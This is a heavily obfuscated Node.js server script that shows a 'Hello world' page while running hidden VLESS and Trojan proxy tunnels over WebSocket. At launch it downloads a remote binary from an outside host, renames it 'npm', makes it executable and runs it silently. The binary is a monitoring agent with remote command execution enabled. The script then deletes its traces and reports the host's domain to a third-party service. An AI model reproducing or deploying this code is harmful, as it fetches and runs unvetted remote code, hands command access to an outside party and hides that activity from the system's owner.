const _0x329f40=_0x11c2;(function(_0x20b73d,_0xf2083d){const _0x404c5d=_0x11c2,_0x1f356f=_0x20b73d();while(!![]){try{const _0x395a09=parseInt(_0x404c5d(0x130))/0x1*(parseInt(_0x404c5d(0x106))/0x2)+-parseInt(_0x404c5d(0xf4))/0x3+-parseInt(_0x404c5d(0xc2))/0x4*(-parseInt(_0x404c5d(0xe2))/0x5)+parseInt(_0x404c5d(0xc0))/0x6*(parseInt(_0x404c5d(0x117))/0x7)+-parseInt(_0x404c5d(0xda))/0x8+parseInt(_0x404c5d(0x124))/0x9*(parseInt(_0x404c5d(0x126))/0xa)+-parseInt(_0x404c5d(0xe7))/0xb*(-parseInt(_0x404c5d(0xc6))/0xc);if(_0x395a09===_0xf2083d)break;else _0x1f356f['push'](_0x1f356f['shift']());}catch(_0x335871){_0x1f356f['push'](_0x1f356f['shift']());}}}(_0x2166,0xf3e64));function _0x11c2(_0x8281c7,_0x116801){_0x8281c7=_0x8281c7-0xb9;const _0x21660e=_0x2166();let _0x11c22f=_0x21660e[_0x8281c7];return _0x11c22f;}const os=require('os'),http=require(_0x329f40(0xf5)),fs=require('fs'),axios=require('axios'),net=require(_0x329f40(0x132)),path=require('path'),crypto=require(_0x329f40(0x118)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x329f40(0xc9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x329f40(0x101)]['UUID']||_0x329f40(0x116),NEZHA_SERVER=process['env'][_0x329f40(0xe3)]||'',NEZHA_PORT=process[_0x329f40(0x101)][_0x329f40(0xe9)]||'',NEZHA_KEY=process[_0x329f40(0x101)]['NEZHA_KEY']||'',DOMAIN=process[_0x329f40(0x101)][_0x329f40(0xfc)]||_0x329f40(0x119),AUTO_ACCESS=process['env'][_0x329f40(0xc8)]||!![],WSPATH=process[_0x329f40(0x101)][_0x329f40(0xee)]||UUID[_0x329f40(0x122)](0x0,0x8),SUB_PATH=process[_0x329f40(0x101)][_0x329f40(0x111)]||_0x329f40(0xe8),NAME=process[_0x329f40(0x101)]['NAME']||'',PORT=process['env'][_0x329f40(0xea)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x12ed2a=_0x329f40;try{const _0x364c04=await axios[_0x12ed2a(0xeb)](_0x12ed2a(0x114)),_0x46ad93=_0x364c04[_0x12ed2a(0xd5)];ISP=(_0x46ad93[_0x12ed2a(0xbb)]+'-'+_0x46ad93[_0x12ed2a(0x12e)])[_0x12ed2a(0xdb)](/ /g,'_');}catch(_0x1b1048){ISP=_0x12ed2a(0xdf);}};GetISP();const httpServer=http['createServer']((_0x4d99f9,_0x1051c4)=>{const _0x265301=_0x329f40;if(_0x4d99f9[_0x265301(0x103)]==='/'){const _0x19a040=path[_0x265301(0xec)](__dirname,_0x265301(0x10f));fs['readFile'](_0x19a040,_0x265301(0xcf),(_0x2e19a9,_0x3e5593)=>{const _0x461fd7=_0x265301;if(_0x2e19a9){_0x1051c4[_0x461fd7(0xe0)](0xc8,{'Content-Type':_0x461fd7(0xf8)}),_0x1051c4[_0x461fd7(0x129)](_0x461fd7(0xb9));return;}_0x1051c4[_0x461fd7(0xe0)](0xc8,{'Content-Type':_0x461fd7(0xf8)}),_0x1051c4[_0x461fd7(0x129)](_0x3e5593);});return;}else{if(_0x4d99f9[_0x265301(0x103)]==='/'+SUB_PATH){const _0x108394=NAME?NAME+'-'+ISP:ISP,_0x676de7=_0x265301(0xbf)+UUID+'@'+DOMAIN+_0x265301(0xcc)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x265301(0x102)+WSPATH+'#'+_0x108394,_0x2f31a7='trojan://'+UUID+'@'+DOMAIN+_0x265301(0x109)+DOMAIN+_0x265301(0xfa)+DOMAIN+_0x265301(0x102)+WSPATH+'#'+_0x108394,_0x363e58=_0x676de7+'\x0a'+_0x2f31a7,_0x209b2a=Buffer['from'](_0x363e58)[_0x265301(0x112)](_0x265301(0x123));_0x1051c4['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x1051c4[_0x265301(0x129)](_0x209b2a+'\x0a');}else _0x1051c4[_0x265301(0xe0)](0x194,{'Content-Type':_0x265301(0xff)}),_0x1051c4[_0x265301(0x129)](_0x265301(0xd7));}}),wss=new WebSocket[(_0x329f40(0xdc))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x329f40(0x125),_0x329f40(0x108)];function resolveHost(_0x321164){return new Promise((_0x356ba5,_0x332917)=>{const _0x2234c1=_0x11c2;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2234c1(0xc7)](_0x321164)){_0x356ba5(_0x321164);return;}let _0x4af591=0x0;function _0x2421ae(){const _0x5a8126=_0x2234c1;if(_0x4af591>=DNS_SERVERS[_0x5a8126(0x104)]){_0x332917(new Error(_0x5a8126(0x127)+_0x321164+_0x5a8126(0x100)));return;}const _0x1fb579=DNS_SERVERS[_0x4af591];_0x4af591++;const _0x543375=_0x5a8126(0xd4)+encodeURIComponent(_0x321164)+_0x5a8126(0x121);axios[_0x5a8126(0xeb)](_0x543375,{'timeout':0x1388,'headers':{'Accept':_0x5a8126(0xfd)}})[_0x5a8126(0xce)](_0x34451e=>{const _0x5542ad=_0x5a8126,_0x4ba7a6=_0x34451e[_0x5542ad(0xd5)];if(_0x4ba7a6['Status']===0x0&&_0x4ba7a6[_0x5542ad(0xca)]&&_0x4ba7a6[_0x5542ad(0xca)][_0x5542ad(0x104)]>0x0){const _0x33e68c=_0x4ba7a6[_0x5542ad(0xca)]['find'](_0x5a3a97=>_0x5a3a97[_0x5542ad(0xd1)]===0x1);if(_0x33e68c){_0x356ba5(_0x33e68c['data']);return;}}_0x2421ae();})[_0x5a8126(0xd3)](_0x28d7ef=>{_0x2421ae();});}_0x2421ae();});}function _0x2166(){const _0x4a170e=['https://amd64.ssss.nyc.mn/v1','Unknown','writeHead','https://amd64.ssss.nyc.mn/agent','15HnIKLK','NEZHA_SERVER','npm\x20download\x20successfully','trim','443','23353LCEOoh','sub','NEZHA_PORT','PORT','get','join','readUInt8','WSPATH','digest','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','send','https://arm64.ssss.nyc.mn/agent','application/json','1257129ifrIAT','http','config.yaml','log','text/html','split','&fp=chrome&type=ws&host=','hex','DOMAIN','application/dns-json','every','text/plain','\x20with\x20all\x20DNS\x20servers','env','&path=%2F','url','length','https://oooo.serv00.net/add-url','96UNPyMJ','npm','1.1.1.1',':443?security=tls&sni=','unlink','error','aarch64','Automatic\x20Access\x20Task\x20added\x20successfully','connect','index.html','error:\x20','SUB_PATH','toString','\x20-p\x20','https://api.ip.sb/geoip','post','7f28b186-c31d-4948-92d0-2229d3296c97','24395dzBaAZ','crypto','1234.abc.com','arm64','includes','arm','finish','pipe','--tls','listen','&type=A','slice','base64','25281PdOavL','8.8.4.4','170LJySsY','Failed\x20to\x20resolve\x20','map','end','2083','message','Server\x20is\x20running\x20on\x20port\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','isp','write','36065WAumVG','chmod\x20+x\x20npm','net','Hello\x20world!','utf-8','country_code','stream','npm\x20is\x20already\x20running,\x20skip\x20running...','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vless://','1230bDyqUZ','pop','365100ZEuhiL','true','once','false','1860BQoLGR','test','AUTO_ACCESS','child_process','Answer','arch',':443?encryption=none&security=tls&sni=','/bin/bash','then','utf8','update','type','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','catch','https://dns.google/resolve?name=','data','substr','Not\x20Found\x0a','8443','npm\x20is\x20running','13425064lMpCem','replace','Server','client_secret:\x20'];_0x2166=function(){return _0x4a170e;};return _0x2166();}function handleVlessConnection(_0x357990,_0x1f349f){const _0x2eb07e=_0x329f40,[_0x207307]=_0x1f349f,_0x251e75=_0x1f349f[_0x2eb07e(0x122)](0x1,0x11);if(!_0x251e75[_0x2eb07e(0xfe)]((_0x46aef9,_0x581b02)=>_0x46aef9==parseInt(uuid[_0x2eb07e(0xd6)](_0x581b02*0x2,0x2),0x10)))return![];let _0x26c9df=_0x1f349f[_0x2eb07e(0x122)](0x11,0x12)[_0x2eb07e(0xed)]()+0x13;const _0x12667a=_0x1f349f[_0x2eb07e(0x122)](_0x26c9df,_0x26c9df+=0x2)['readUInt16BE'](0x0),_0x2492ae=_0x1f349f[_0x2eb07e(0x122)](_0x26c9df,_0x26c9df+=0x1)[_0x2eb07e(0xed)](),_0x5198c5=_0x2492ae==0x1?_0x1f349f['slice'](_0x26c9df,_0x26c9df+=0x4)[_0x2eb07e(0xec)]('.'):_0x2492ae==0x2?new TextDecoder()['decode'](_0x1f349f[_0x2eb07e(0x122)](_0x26c9df+0x1,_0x26c9df+=0x1+_0x1f349f[_0x2eb07e(0x122)](_0x26c9df,_0x26c9df+0x1)[_0x2eb07e(0xed)]())):_0x2492ae==0x3?_0x1f349f[_0x2eb07e(0x122)](_0x26c9df,_0x26c9df+=0x10)['reduce']((_0x3715a8,_0x2043e9,_0x31166c,_0xb65988)=>_0x31166c%0x2?_0x3715a8['concat'](_0xb65988['slice'](_0x31166c-0x1,_0x31166c+0x1)):_0x3715a8,[])['map'](_0x6276f3=>_0x6276f3['readUInt16BE'](0x0)[_0x2eb07e(0x112)](0x10))[_0x2eb07e(0xec)](':'):'';_0x357990[_0x2eb07e(0xf1)](new Uint8Array([_0x207307,0x0]));const _0x3495c9=createWebSocketStream(_0x357990);return resolveHost(_0x5198c5)[_0x2eb07e(0xce)](_0x13c04f=>{const _0x1f74cb=_0x2eb07e;net[_0x1f74cb(0x10e)]({'host':_0x13c04f,'port':_0x12667a},function(){const _0x36eeec=_0x1f74cb;this['write'](_0x1f349f[_0x36eeec(0x122)](_0x26c9df)),_0x3495c9['on'](_0x36eeec(0x10b),()=>{})[_0x36eeec(0x11e)](this)['on']('error',()=>{})['pipe'](_0x3495c9);})['on']('error',()=>{});})[_0x2eb07e(0xd3)](_0x1ffae6=>{const _0x41d306=_0x2eb07e;net[_0x41d306(0x10e)]({'host':_0x5198c5,'port':_0x12667a},function(){const _0x310f47=_0x41d306;this[_0x310f47(0x12f)](_0x1f349f['slice'](_0x26c9df)),_0x3495c9['on'](_0x310f47(0x10b),()=>{})[_0x310f47(0x11e)](this)['on'](_0x310f47(0x10b),()=>{})[_0x310f47(0x11e)](_0x3495c9);})['on'](_0x41d306(0x10b),()=>{});}),!![];}function handleTrojanConnection(_0x28d8ec,_0x14429c){const _0x5d33ed=_0x329f40;try{if(_0x14429c[_0x5d33ed(0x104)]<0x3a)return![];const _0x2af274=_0x14429c[_0x5d33ed(0x122)](0x0,0x38)[_0x5d33ed(0x112)](),_0x146f7b=[UUID];let _0x2f1dd3=null;for(const _0x86f367 of _0x146f7b){const _0xdc07d4=crypto['createHash']('sha224')[_0x5d33ed(0xd0)](_0x86f367)[_0x5d33ed(0xef)](_0x5d33ed(0xfb));if(_0xdc07d4===_0x2af274){_0x2f1dd3=_0x86f367;break;}}if(!_0x2f1dd3)return![];let _0x38df55=0x38;_0x14429c[_0x38df55]===0xd&&_0x14429c[_0x38df55+0x1]===0xa&&(_0x38df55+=0x2);const _0x5ca292=_0x14429c[_0x38df55];if(_0x5ca292!==0x1)return![];_0x38df55+=0x1;const _0x277b75=_0x14429c[_0x38df55];_0x38df55+=0x1;let _0x18226e,_0x1b06c7;if(_0x277b75===0x1)_0x18226e=_0x14429c[_0x5d33ed(0x122)](_0x38df55,_0x38df55+0x4)[_0x5d33ed(0xec)]('.'),_0x38df55+=0x4;else{if(_0x277b75===0x3){const _0xf87680=_0x14429c[_0x38df55];_0x38df55+=0x1,_0x18226e=_0x14429c['slice'](_0x38df55,_0x38df55+_0xf87680)['toString'](),_0x38df55+=_0xf87680;}else{if(_0x277b75===0x4)_0x18226e=_0x14429c[_0x5d33ed(0x122)](_0x38df55,_0x38df55+0x10)['reduce']((_0x14f760,_0x4a9ade,_0x23ca2e,_0xa1f61c)=>_0x23ca2e%0x2?_0x14f760['concat'](_0xa1f61c[_0x5d33ed(0x122)](_0x23ca2e-0x1,_0x23ca2e+0x1)):_0x14f760,[])[_0x5d33ed(0x128)](_0x45b16d=>_0x45b16d['readUInt16BE'](0x0)[_0x5d33ed(0x112)](0x10))[_0x5d33ed(0xec)](':'),_0x38df55+=0x10;else return![];}}_0x1b06c7=_0x14429c['readUInt16BE'](_0x38df55),_0x38df55+=0x2;_0x38df55<_0x14429c['length']&&_0x14429c[_0x38df55]===0xd&&_0x14429c[_0x38df55+0x1]===0xa&&(_0x38df55+=0x2);const _0x25228f=createWebSocketStream(_0x28d8ec);return resolveHost(_0x18226e)[_0x5d33ed(0xce)](_0x442f5c=>{const _0x16fe41=_0x5d33ed;net[_0x16fe41(0x10e)]({'host':_0x442f5c,'port':_0x1b06c7},function(){const _0xf69b20=_0x16fe41;_0x38df55<_0x14429c[_0xf69b20(0x104)]&&this[_0xf69b20(0x12f)](_0x14429c[_0xf69b20(0x122)](_0x38df55)),_0x25228f['on'](_0xf69b20(0x10b),()=>{})['pipe'](this)['on'](_0xf69b20(0x10b),()=>{})[_0xf69b20(0x11e)](_0x25228f);})['on'](_0x16fe41(0x10b),()=>{});})[_0x5d33ed(0xd3)](_0x24317b=>{const _0x237397=_0x5d33ed;net[_0x237397(0x10e)]({'host':_0x18226e,'port':_0x1b06c7},function(){const _0x3b5743=_0x237397;_0x38df55<_0x14429c[_0x3b5743(0x104)]&&this['write'](_0x14429c[_0x3b5743(0x122)](_0x38df55)),_0x25228f['on'](_0x3b5743(0x10b),()=>{})[_0x3b5743(0x11e)](this)['on'](_0x3b5743(0x10b),()=>{})['pipe'](_0x25228f);})['on']('error',()=>{});}),!![];}catch(_0x2ae69e){return![];}}wss['on']('connection',(_0xdfd70d,_0x2c63ec)=>{const _0x14b2d6=_0x329f40,_0x3b4113=_0x2c63ec[_0x14b2d6(0x103)]||'';_0xdfd70d[_0x14b2d6(0xc4)](_0x14b2d6(0x12b),_0x258b1c=>{const _0x39abd1=_0x14b2d6;if(_0x258b1c['length']>0x11&&_0x258b1c[0x0]===0x0){const _0x4bfac7=_0x258b1c[_0x39abd1(0x122)](0x1,0x11),_0x3915e2=_0x4bfac7[_0x39abd1(0xfe)]((_0xc8bac9,_0x428d9a)=>_0xc8bac9==parseInt(uuid[_0x39abd1(0xd6)](_0x428d9a*0x2,0x2),0x10));if(_0x3915e2){!handleVlessConnection(_0xdfd70d,_0x258b1c)&&_0xdfd70d['close']();return;}}!handleTrojanConnection(_0xdfd70d,_0x258b1c)&&_0xdfd70d['close']();})['on'](_0x14b2d6(0x10b),()=>{});});const getDownloadUrl=()=>{const _0x5539ed=_0x329f40,_0x45e034=os[_0x5539ed(0xcb)]();return _0x45e034===_0x5539ed(0x11c)||_0x45e034===_0x5539ed(0x11a)||_0x45e034===_0x5539ed(0x10c)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x5539ed(0xf2):!NEZHA_PORT?_0x5539ed(0xde):_0x5539ed(0xe1);},downloadFile=async()=>{const _0x317903=_0x329f40;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x142072=getDownloadUrl(),_0x2e0139=await axios({'method':_0x317903(0xeb),'url':_0x142072,'responseType':_0x317903(0xbc)}),_0xafada5=fs['createWriteStream']('npm');return _0x2e0139[_0x317903(0xd5)][_0x317903(0x11e)](_0xafada5),new Promise((_0x150c98,_0x15fe3e)=>{const _0x15d7d1=_0x317903;_0xafada5['on'](_0x15d7d1(0x11d),()=>{const _0x2982de=_0x15d7d1;console[_0x2982de(0xf7)](_0x2982de(0xe4)),exec(_0x2982de(0x131),_0x472241=>{if(_0x472241)_0x15fe3e(_0x472241);_0x150c98();});}),_0xafada5['on'](_0x15d7d1(0x10b),_0x15fe3e);});}catch(_0x214af1){throw _0x214af1;}},runnz=async()=>{const _0x21a9ec=_0x329f40;try{const _0x11e8e8=execSync(_0x21a9ec(0xd2),{'encoding':_0x21a9ec(0xba)});if(_0x11e8e8[_0x21a9ec(0xe5)]()!==''){console[_0x21a9ec(0xf7)](_0x21a9ec(0xbd));return;}}catch(_0x5c68bb){}await downloadFile();let _0x2892f5='',_0x1647f1=[_0x21a9ec(0xe6),_0x21a9ec(0xd8),'2096','2087',_0x21a9ec(0x12a),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1024a8=_0x1647f1[_0x21a9ec(0x11b)](NEZHA_PORT)?_0x21a9ec(0x11f):'';_0x2892f5='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x21a9ec(0x113)+NEZHA_KEY+'\x20'+_0x1024a8+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x476bdb=NEZHA_SERVER[_0x21a9ec(0x11b)](':')?NEZHA_SERVER[_0x21a9ec(0xf9)](':')[_0x21a9ec(0xc1)]():'',_0x51d2eb=_0x1647f1['includes'](_0x476bdb)?_0x21a9ec(0xc3):_0x21a9ec(0xc5),_0x2ab073=_0x21a9ec(0xdd)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x21a9ec(0xbe)+_0x51d2eb+_0x21a9ec(0xf0)+UUID;fs['writeFileSync'](_0x21a9ec(0xf6),_0x2ab073);}_0x2892f5=_0x21a9ec(0x12d);}else{console[_0x21a9ec(0xf7)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2892f5,{'shell':_0x21a9ec(0xcd)},_0x2f1651=>{const _0x4b07c6=_0x21a9ec;if(_0x2f1651)console['error']('npm\x20running\x20error:',_0x2f1651);else console[_0x4b07c6(0xf7)](_0x4b07c6(0xd9));});}catch(_0xae6763){console['error'](_0x21a9ec(0x110)+_0xae6763);}};async function addAccessTask(){const _0x36d45b=_0x329f40;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2aae96='https://'+DOMAIN;try{const _0xade9b6=await axios[_0x36d45b(0x115)](_0x36d45b(0x105),{'url':_0x2aae96},{'headers':{'Content-Type':_0x36d45b(0xf3)}});console['log'](_0x36d45b(0x10d));}catch(_0x2cfcb8){}}const delFiles=()=>{const _0x45fd1f=_0x329f40;fs['unlink'](_0x45fd1f(0x107),()=>{}),fs[_0x45fd1f(0x10a)](_0x45fd1f(0xf6),()=>{});};httpServer[_0x329f40(0x120)](PORT,()=>{const _0x4cf74d=_0x329f40;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x4cf74d(0x12c)+PORT);});
